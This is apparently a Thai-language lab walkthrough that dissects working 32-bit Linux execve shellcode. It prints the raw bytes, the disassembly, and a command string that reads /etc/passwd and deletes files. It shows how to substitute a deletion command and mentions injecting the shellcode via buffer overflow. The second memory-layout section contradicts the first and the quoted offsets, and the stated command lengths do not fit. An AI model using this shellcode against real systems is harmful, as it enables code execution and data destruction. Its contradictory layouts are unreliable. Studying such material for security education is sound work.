# การวิเคราะห์ Shellcode แบบละเอียด

## 1. โครงสร้างภาพรวม

```python
shellcode = (
   # Machine Code Section (Assembly Instructions)
   "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
   "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
   "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
   
   # String Data Section
   "/bin/bash*"
   "-c*"
   "/bin/ls -l; echo Hello 32; /bin/tail -n 2 /etc/passwd; /bin/rm -f /tmp/test     *"
   
   # Pointer Placeholders (จะถูกแทนที่ในขณะ runtime)
   "AAAA"   # argv[0] pointer
   "BBBB"   # argv[1] pointer  
   "CCCC"   # argv[2] pointer
   "DDDD"   # argv[3] pointer (NULL)
   "XXXX"
)
```

## 2. การวิเคราะห์ Machine Code (Assembly)

### ส่วนที่ 1: Jump และ Call
```assembly
\xeb\x29     # jmp +0x29 (กระโดดไป 41 bytes)
             # ไปที่ instruction ที่เรียก call
             
\xe8\xd2\xff\xff\xff  # call -0x2e (เรียกกลับมา)
                      # push return address ลง stack แล้วกระโดดกลับมา
```
**หลักการ**: ใช้เทคนิค "call/pop" เพื่อหาที่อยู่ของสตริงในหน่วยความจำ

### ส่วนที่ 2: Setup และ String Processing
```assembly
\x5b         # pop %ebx (ได้ address ของสตริงมาใน ebx)
\x31\xc0     # xor %eax,%eax (clear eax = 0)

# ใส่ null terminators ที่ตำแหน่ง * 
\x88\x43\x09 # mov %al,0x9(%ebx)  # "/bin/bash" + 9 = ตำแหน่งของ *
\x88\x43\x0c # mov %al,0xc(%ebx)  # "-c" + 2 = ตำแหน่งของ *
\x88\x43\x47 # mov %al,0x47(%ebx) # คำสั่ง + n = ตำแหน่งของ *
```

### ส่วนที่ 3: สร้าง Argument Array
```assembly
# สร้าง argv array ใน memory
\x89\x5b\x48 # mov %ebx,0x48(%ebx) # argv[0] = pointer to "/bin/bash"
\x8d\x4b\x0a # lea 0xa(%ebx),%ecx  # ecx = pointer to "-c"  
\x89\x4b\x4c # mov %ecx,0x4c(%ebx) # argv[1] = pointer to "-c"
\x8d\x4b\x0d # lea 0xd(%ebx),%ecx  # ecx = pointer to command
\x89\x4b\x50 # mov %ecx,0x50(%ebx) # argv[2] = pointer to command
\x89\x43\x54 # mov %eax,0x54(%ebx) # argv[3] = NULL (eax = 0)
```

### ส่วนที่ 4: เรียก System Call
```assembly
\x8d\x4b\x48 # lea 0x48(%ebx),%ecx # ecx = pointer to argv array
\x31\xd2     # xor %edx,%edx       # edx = NULL (envp)
\x31\xc0     # xor %eax,%eax       # clear eax
\xb0\x0b     # mov $0xb,%al        # eax = 11 (sys_execve)
\xcd\x80     # int $0x80           # เรียก system call
```

## 3. การทำงานของ System Call

### Parameters สำหรับ execve():
- **EAX = 11**: เลข system call สำหรับ `execve()`
- **EBX**: pointer ไปยัง filename ("/bin/bash")
- **ECX**: pointer ไปยัง argv array
- **EDX**: pointer ไปยัง envp (NULL)

### Argv Array ที่สร้างขึ้น:
```c
argv[0] = "/bin/bash"
argv[1] = "-c"
argv[2] = "คำสั่งที่จะรัน"
argv[3] = NULL
```

### ผลลัพธ์:
```bash
execve("/bin/bash", ["/bin/bash", "-c", "คำสั่งของคุณ"], NULL);
```

## 4. Memory Layout

```
Address     Content
-------     -------
ebx+0       "/bin/bash\x00"         (9 bytes + null)
ebx+10      "-c\x00"                (2 bytes + null)  
ebx+13      "command string\x00"    (ความยาวตามคำสั่ง + null)
...
ebx+72      [pointer to "/bin/bash"] (argv[0])
ebx+76      [pointer to "-c"]        (argv[1])
ebx+80      [pointer to command]     (argv[2]) 
ebx+84      [NULL]                   (argv[3])
```

## 5. ข้อสำคัญในการแก้ไข

### Position Markers:
- `*` ในแต่ละสตริงจะถูกแทนที่ด้วย `\x00` (null terminator)
- ตำแหน่งของ `*` ต้องตรงกับ offset ใน assembly code

### การคำนวณ Offset:
```python
"/bin/bash*"    # ตำแหน่ง * = +9 (\x88\x43\x09)
"-c*"           # ตำแหน่ง * = +12 (\x88\x43\x0c) 
"command...*"   # ตำแหน่ง * = +71 (\x88\x43\x47 = 0x47 = 71)
```

### การปรับความยาวคำสั่ง:
เมื่อแก้ไขคำสั่ง ต้องเติมหรือลบช่องว่างให้ตำแหน่ง `*` อยู่ที่ offset 71

## 6. ตัวอย่างการแก้ไขสำหรับ Task 1

### คำสั่งเดิม (71 characters):
```python
"/bin/ls -l; echo Hello 32; /bin/tail -n 2 /etc/passwd; /bin/rm -f /tmp/test     *"
```

### คำสั่งใหม่ (ลบไฟล์):
```python
"/bin/rm -f /tmp/target_file                                                     *"
# ต้องมีความยาว 71 characters ก่อนถึง *
```

## 7. ข้อจำกัดและการพิจารณา

### ข้อจำกัด:
1. ขนาดของ shellcode มีขอบเขต (200 bytes)
2. ไม่สามารถมี null bytes (\x00) ในส่วน machine code
3. ตำแหน่ง offset ต้องแม่นยำ

### การใช้งานใน Buffer Overflow:
- Shellcode นี้จะถูกใส่ลงใน buffer
- จำเป็นต้องรู้ที่อยู่ของ buffer เพื่อ redirect execution
- ใช้ร่วมกับการ overwrite return address

## 8. เทคนิคที่ใช้

### Call/Pop Technique:
- หลีกเลี่ยงการใช้ absolute address
- ทำให้ shellcode เป็น position-independent

### NULL-Free Encoding:
- ใช้ XOR แทนการใส่ค่า 0 โดยตรง
- ใช้ LEA แทน MOV ในบางกรณี

### Compact Design:
- ใช้ register อย่างมีประสิทธิภาพ
- ลดขนาด instruction ให้น้อยที่สุด



## การทำงานของ Memory Space Reservation ใน Shellcode

เมื่อ shellcode รัน มันไม่ได้รู้ว่าจะอยู่ที่อยู่ไหนในหน่วยความจำ ดังนั้นต้องใช้เทคนิคพิเศษ

## ขั้นตอนการทำงาน:

### 1. Initial Memory Layout
```
Address    Content
-------    -------
ebx+0      "\xeb\x29\x5b..." (machine code)
ebx+43     "/bin/bash*"
ebx+53     "-c*"  
ebx+56     "command string*"
ebx+115    "AAAA"          <- placeholder 1
ebx+119    "BBBB"          <- placeholder 2
ebx+123    "CCCC"          <- placeholder 3
ebx+127    "DDDD"          <- placeholder 4
```

### 2. หลังจาก Assembly ทำงาน
Assembly code จะ**คำนวณและเขียนทับ**:

```assembly
# คำนวณ addresses
\x89\x5b\x48   # mov %ebx,0x48(%ebx)    
# เขียน address ของ "/bin/bash" ทับ "AAAA"

\x8d\x4b\x0a   # lea 0xa(%ebx),%ecx     
# คำนวณ address ของ "-c"
\x89\x4b\x4c   # mov %ecx,0x4c(%ebx)    
# เขียน address นี้ทับ "BBBB"

\x8d\x4b\x0d   # lea 0xd(%ebx),%ecx     
# คำนวณ address ของ command
\x89\x4b\x50   # mov %ecx,0x50(%ebx)    
# เขียน address นี้ทับ "CCCC"

\x89\x43\x54   # mov %eax,0x54(%ebx)    
# เขียน NULL (0) ทับ "DDDD"
```

### 3. ผลลัพธ์หลังการแปลง
```
Address    Content               Purpose
-------    -------               -------
ebx+115    [ptr to "/bin/bash"]  argv[0]
ebx+119    [ptr to "-c"]         argv[1] 
ebx+123    [ptr to "command"]    argv[2]
ebx+127    [0x00000000]          argv[3] = NULL
```

## ทำไมต้องใช้ Placeholder:

### ปัญหา: Position Independence
- Shellcode ไม่รู้ว่าจะถูกโหลดที่อยู่ไหน
- ไม่สามารถใช้ absolute addresses ได้

### วิธีแก้: Dynamic Address Calculation
1. **Reserve Space**: ใช้ "AAAA" เป็น placeholder (4 bytes สำหรับ 32-bit pointer)
2. **Calculate at Runtime**: Assembly คำนวณ address จริงตอนทำงาน  
3. **Overwrite**: เขียน address จริงทับ placeholder

### ตัวอย่างการคำนวณ:
```c
// สมมติ shellcode โหลดที่ address 0x12340000
char *base = 0x12340000;

// Assembly จะคำนวณ:
argv[0] = base + 43;  // "/bin/bash" อยู่ที่ offset 43
argv[1] = base + 53;  // "-c" อยู่ที่ offset 53  
argv[2] = base + 56;  // command อยู่ที่ offset 56
argv[3] = NULL;
```

## ความสำคัญ:
- **Self-Modifying Code**: Shellcode แก้ไขตัวเองขณะทำงาน
- **No External Dependencies**: ไม่ต้องพึ่ง linker หรือ loader
- **Compact Design**: ใช้ space น้อยที่สุดแต่ได้ผลลัพธ์เต็มที่

นี่คือเหตุผลที่ placeholders จำเป็น - มันคือ "ที่ว่าง" ให้ assembly เขียน pointers ที่คำนวณได้ตอน runtime